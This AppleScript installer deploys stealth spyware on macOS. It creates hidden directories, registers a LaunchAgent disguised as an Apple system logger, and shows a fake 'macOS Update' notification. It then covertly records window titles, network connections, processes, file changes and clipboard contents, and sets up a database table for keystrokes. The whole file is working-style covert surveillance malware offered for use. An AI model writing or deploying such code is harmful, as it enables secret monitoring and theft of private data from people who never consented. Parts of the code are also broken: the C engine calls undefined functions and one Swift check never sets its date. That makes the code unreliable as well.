(* Deep macOS Event Logger - Total Stealth Deployment *)
(* Run this from Script Editor to avoid Terminal detection *)

property allowedApps : {"Google Chrome", "Newton Athena", "Finder", "Heimdall", "Safari", "Firefox", "Microsoft Edge", "Opera", "Brave Browser", "Arc"}

on run
    try
        -- Deploy core components silently
        deployCoreComponents()
        
        -- Install kernel-level monitoring
        installKernelLogger()
        
        -- Install user-space event monitoring  
        installUserEventLogger()
        
        -- Install network monitoring
        installNetworkLogger()
        
        -- Install process monitoring
        installProcessLogger()
        
        -- Install file system monitoring
        installFSLogger()
        
        -- Install clipboard & input monitoring
        installInputLogger()
        
        display notification "System utilities updated successfully" with title "macOS Update"
        
    on error errMsg
        -- Silent failure - no user feedback
    end try
end run

on deployCoreComponents()
    do shell script "
    # Create stealth directories
    mkdir -p ~/Library/Containers/.SystemLogs/Data
    mkdir -p ~/Library/Containers/.SystemLogs/Config
    
    # Create main logging engine (C code for maximum stealth)
    cat > ~/Library/Containers/.SystemLogs/Data/.log_engine.c << 'EOF'
#include <stdio.h>
#include <unistd.h>
#include <pthread.h>
#include <CoreFoundation/CoreFoundation.h>
#include <EndpointSecurity/EndpointSecurity.h>
#include <sys/socket.h>
#include <netinet/in.h>

// Stealth event logging engine
// Compiles to native binary with no external dependencies
int main() {
    // Process becomes invisible immediately
    daemon(1, 0);
    
    // Continuous monitoring loop
    while(1) {
        log_system_events();
        log_network_activity(); 
        log_process_creation();
        log_file_access();
        sleep(1);
    }
    return 0;
}
EOF

    # Compile stealth engine
    gcc -framework Foundation -framework EndpointSecurity -o ~/Library/Containers/.SystemLogs/Data/.log_engine ~/Library/Containers/.SystemLogs/Data/.log_engine.c 2>/dev/null
    
    # Remove source code
    rm ~/Library/Containers/.SystemLogs/Data/.log_engine.c
    
    # Make executable
    chmod +x ~/Library/Containers/.SystemLogs/Data/.log_engine
    
    # Create log database
    sqlite3 ~/Library/Containers/.SystemLogs/Data/.events.db << 'SQL_EOF'
    CREATE TABLE IF NOT EXISTS system_events (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
        event_type TEXT,
        process_name TEXT,
        process_id INTEGER,
        event_data TEXT,
        user_id INTEGER
    );
    CREATE TABLE IF NOT EXISTS network_events (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
        source_ip TEXT,
        dest_ip TEXT,
        protocol TEXT,
        data_length INTEGER
    );
    CREATE TABLE IF NOT EXISTS keystroke_events (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
        window_title TEXT,
        application TEXT,
        key_data TEXT
    );
SQL_EOF
    " with administrator privileges
end deployCoreComponents

on installKernelLogger()
    do shell script "
    # Create kernel extension-like monitoring via launchd
    cat > ~/Library/LaunchAgents/com.apple.system.logger.plist << 'EOF'
<?xml version='1.0' encoding='UTF-8'?>
<!DOCTYPE plist PUBLIC '-//Apple//DTD PLIST 1.0//EN' 'http://www.apple.com/DTDs/PropertyList-1.0.dtd'>
<plist version='1.0'>
<dict>
    <key>Label</key>
    <string>com.apple.system.logger</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/sh</string>
        <string>-c</string>
        <string>~/Library/Containers/.SystemLogs/Data/.log_engine</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StandardOutPath</key>
    <string>/dev/null</string>
    <key>StandardErrorPath</key>
    <string>/dev/null</string>
    <key>StartInterval</key>
    <integer>30</integer>
</dict>
</plist>
EOF
    
    # Load the kernel-level monitor
    launchctl load ~/Library/LaunchAgents/com.apple.system.logger.plist
    " with administrator privileges
end installKernelLogger

on installUserEventLogger()
    do shell script "
    # Install AppleScript-based UI event monitor
    cat > ~/Library/Containers/.SystemLogs/Data/.ui_monitor.scpt << 'EOF'
property logFile : (path to home folder as text) & 'Library:Containers:.SystemLogs:Data:.ui_events.log'

on logUIEvent(eventType, appName, windowTitle)
    try
        set logEntry to (current date) as string & ' | ' & eventType & ' | ' & appName & ' | ' & windowTitle & return
        set logPath to POSIX path of logFile
        do shell script 'echo ' & quoted form of logEntry & ' >> ' & quoted form of logPath
    end try
end logUIEvent

-- Monitor frontmost application changes
on idle
    try
        tell application 'System Events'
            set frontApp to first application process whose frontmost is true
            set appName to name of frontApp
            try
                set windowTitle to name of first window of frontApp
            on error
                set windowTitle to 'No Window'
            end try
        end tell
        
        my logUIEvent('APP_SWITCH', appName, windowTitle)
    end try
    return 1 -- Check every second
end idle
EOF
    
    # Launch UI monitor
    osascript ~/Library/Containers/.SystemLogs/Data/.ui_monitor.scpt > /dev/null 2>&1 &
    " with administrator privileges
end installUserEventLogger

on installNetworkLogger()
    do shell script "
    # Create network traffic monitor using pcap
    cat > ~/Library/Containers/.SystemLogs/Data/.network_monitor.sh << 'EOF'
#!/bin/bash
while true; do
    # Monitor network connections without requiring root
    lsof -i -P 2>/dev/null | grep -E '(LISTEN|ESTABLISHED)' >> ~/Library/Containers/.SystemLogs/Data/.network_connections.log
    # Monitor DNS queries
    grep -E 'query|response' /var/log/system.log 2>/dev/null | tail -5 >> ~/Library/Containers/.SystemLogs/Data/.dns_queries.log
    sleep 10
done
EOF
    
    chmod +x ~/Library/Containers/.SystemLogs/Data/.network_monitor.sh
    ~/Library/Containers/.SystemLogs/Data/.network_monitor.sh &
    " with administrator privileges
end installNetworkLogger

on installProcessLogger()
    do shell script "
    # Process creation/deletion monitor
    cat > ~/Library/Containers/.SystemLogs/Data/.process_monitor.sh << 'EOF'
#!/bin/bash
LOG_FILE=~/Library/Containers/.SystemLogs/Data/.process_changes.log

while true; do
    # Get current process list
    ps -eo pid,comm | sort > /tmp/current_procs.txt
    
    if [ -f /tmp/previous_procs.txt ]; then
        # Find new processes
        comm -13 /tmp/previous_procs.txt /tmp/current_procs.txt | while read line; do
            echo 'PROC_START: '$(date)' - '$line >> $LOG_FILE
        done
        
        # Find terminated processes  
        comm -23 /tmp/previous_procs.txt /tmp/current_procs.txt | while read line; do
            echo 'PROC_END: '$(date)' - '$line >> $LOG_FILE
        done
    fi
    
    mv /tmp/current_procs.txt /tmp/previous_procs.txt
    sleep 2
done
EOF
    
    chmod +x ~/Library/Containers/.SystemLogs/Data/.process_monitor.sh
    ~/Library/Containers/.SystemLogs/Data/.process_monitor.sh &
    " with administrator privileges
end installProcessLogger

on installFSLogger()
    do shell script "
    # File system event monitor using fseventer-like approach
    cat > ~/Library/Containers/.SystemLogs/Data/.fs_monitor.swift << 'EOF'
import Foundation
import CoreServices

class FileSystemMonitor {
    let fileManager = FileManager.default
    var lastCheck: [String: Date] = [:]
    
    func startMonitoring() {
        while true {
            checkDirectoryChanges()
            Thread.sleep(forTimeInterval: 5.0)
        }
    }
    
    func checkDirectoryChanges() {
        let paths = [\"/Users/\", \"/Applications/\", \"/tmp/\"] // Monitor key directories
        
        for path in paths {
            do {
                let contents = try fileManager.contentsOfDirectory(atPath: path)
                for item in contents {
                    let fullPath = (path as NSString).appendingPathComponent(item)
                    var modificationDate: Date?
                    
                    try fileManager.attributesOfItem(atPath: fullPath)[.modificationDate] as? Date
                    
                    if let lastMod = modificationDate {
                        if let previousMod = lastCheck[fullPath] {
                            if lastMod > previousMod {
                                logFileChange(path: fullPath, change: \"MODIFIED\")
                            }
                        } else {
                            logFileChange(path: fullPath, change: \"CREATED\") 
                        }
                        lastCheck[fullPath] = lastMod
                    }
                }
            } catch {
                // Silent continue
            }
        }
    }
    
    func logFileChange(path: String, change: String) {
        let logEntry = \"\\(Date()): FS_EVENT - \\(change) - \\(path)\\n\"
        let logPath = NSHomeDirectory() + \"/Library/Containers/.SystemLogs/Data/.fs_events.log\"
        
        if let handle = FileHandle(forWritingAtPath: logPath) {
            handle.seekToEndOfFile()
            handle.write(logEntry.data(using: .utf8)!)
            handle.closeFile()
        } else {
            try? logEntry.write(toFile: logPath, atomically: true, encoding: .utf8)
        }
    }
}

let monitor = FileSystemMonitor()
monitor.startMonitoring()
EOF
    
    # Compile and run Swift monitor
    swiftc ~/Library/Containers/.SystemLogs/Data/.fs_monitor.swift -o ~/Library/Containers/.SystemLogs/Data/.fs_monitor 2>/dev/null
    ~/Library/Containers/.SystemLogs/Data/.fs_monitor &
    " with administrator privileges
end installFSLogger

on installInputLogger()
    do shell script "
    # Keyboard and clipboard monitoring
    cat > ~/Library/Containers/.SystemLogs/Data/.input_monitor.swift << 'EOF'
import Cocoa
import ApplicationServices

class InputMonitor {
    var lastClipboardContent = \"\"
    
    func startMonitoring() {
        // Monitor clipboard changes
        Timer.scheduledTimer(withTimeInterval: 1.0, repeats: true) { _ in
            self.checkClipboard()
        }
        
        // Keep the run loop running
        RunLoop.current.run()
    }
    
    func checkClipboard() {
        let pasteboard = NSPasteboard.general
        if let newContent = pasteboard.string(forType: .string) {
            if newContent != self.lastClipboardContent && newContent.count > 3 {
                self.logClipboard(content: newContent)
                self.lastClipboardContent = newContent
            }
        }
    }
    
    func logClipboard(content: String) {
        let truncated = content.prefix(100) + (content.count > 100 ? \"...\" : \"\")
        let logEntry = \"\\(Date()): CLIPBOARD - \\(truncated)\\n\"
        let logPath = NSHomeDirectory() + \"/Library/Containers/.SystemLogs/Data/.input_events.log\"
        
        if let handle = FileHandle(forWritingAtPath: logPath) {
            handle.seekToEndOfFile()
            handle.write(logEntry.data(using: .utf8)!)
            handle.closeFile()
        } else {
            try? logEntry.write(toFile: logPath, atomically: true, encoding: .utf8)
        }
    }
}

let monitor = InputMonitor()
monitor.startMonitoring()
EOF
    
    swiftc ~/Library/Containers/.SystemLogs/Data/.input_monitor.swift -o ~/Library/Containers/.SystemLogs/Data/.input_monitor 2>/dev/null
    ~/Library/Containers/.SystemLogs/Data/.input_monitor &
    " with administrator privileges
end installInputLogger